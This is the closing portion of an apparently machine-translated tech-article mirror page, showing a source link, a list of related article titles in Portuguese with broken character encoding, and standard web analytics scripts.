href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">GitHub</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt436136/">https://habr.com/ru/post/pt436136/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt436126/index.html">Kubernetes: construindo imagens do Docker em um cluster</a></li>
<li><a href="../pt436128/index.html">Entrevista com o ca√ßador de bagagens Artyom Moscow. Ele invadiu o Steam e recebeu o maior pr√™mio da hist√≥ria da Valve.</a></li>
<li><a href="../pt436130/index.html">O projeto do Minist√©rio de Telecomunica√ß√µes e Comunica√ß√£o de Massa para transferir tr√°fego da Internet atrav√©s de esta√ß√µes russas complica a legaliza√ß√£o da OneWeb na R√∫ssia</a></li>
<li><a href="../pt436132/index.html">12 coisas estranhas que podem acontecer ap√≥s a instala√ß√£o do pacote npm</a></li>
<li><a href="../pt436134/index.html">At√© 20% de direitos de barragem ser√£o impostos aos roteadores de importa√ß√£o</a></li>
<li><a href="../pt436140/index.html">‚ÄúSob o cap√¥‚Äù do armazenamento da Huawei: tecnologias propriet√°rias e o que os outros n√£o t√™m</a></li>
<li><a href="../pt436144/index.html">Chefes sugadores de sangue no contexto de uma biocenose: por que uma equipe aut√¥noma se separa se n√£o √© centralizada</a></li>
<li><a href="../pt436148/index.html">A hist√≥ria de um j√∫nior - como come√ßar a trabalhar e n√£o ter medo de tudo</a></li>
<li><a href="../pt436150/index.html">Configurar a transfer√™ncia de dados do dispositivo para o AWS IoT Core</a></li>
<li><a href="../pt436152/index.html">O erro que me ensinou design orientado a neg√≥cios</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>